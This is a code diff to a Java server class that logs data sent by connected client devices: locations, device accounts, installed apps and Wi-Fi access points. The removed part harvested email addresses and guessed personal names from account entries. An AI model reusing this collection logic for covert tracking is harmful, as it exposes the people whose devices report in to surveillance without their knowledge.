@@ -37,8 +37,8 @@ public class ClientThread implements Runnable {
         threadLogger = new Logger(Logger.LOG_TYPE_THREADS, "threads");
         locationLogger = new Logger(Logger.LOG_TYPE_LOCATIONS, clientID);
         accountLogger = new Logger(Logger.LOG_TYPE_ACCOUNTS, clientID);
-        installedAppsLogger = new Logger(Logger.LOG_TYPE_INSTALLED_APPS, clientID);
         wifiAPLogger = new Logger(Logger.LOG_WIFI_APS, clientID);
+        installedAppsLogger = new Logger(Logger.LOG_TYPE_INSTALLED_APPS, clientID);
         threadPort = socket.getPort();
         logger.log("New client connected from: " + socket.getRemoteSocketAddress() + " v" + version);
         File directory = new File(clientID);
@@ -176,22 +176,7 @@ public class ClientThread implements Runnable {
             locationLogger.log(message);
             lastLocation = message;
         }
-        if (message.startsWith("Account ")) {
-            String accountName = message.substring(
-                    message.indexOf("name=") + "name=".length(),
-                    message.indexOf(",")
-            );
-            if(accountName.contains("@") && accountName.contains(".")){
-                // entry is probably an email address
-                if(!emailAddresses.contains(accountName)) {
-                    emailAddresses.add(accountName);
-                }
-            } else if (!accountName.matches("WhatsApp") && !accountName.matches("LinkedIn")){
-                // entry is probably a name TODO more company names like the above
-                if(!guessedNames.contains(accountName)) {
-                    guessedNames.add(accountName);
-                }
-            }
+        if (message.startsWith("Accounts:")) {
             accountLogger.log(message);
         }
         if (message.startsWith("Connected to: ") || message.startsWith("IP address")) {
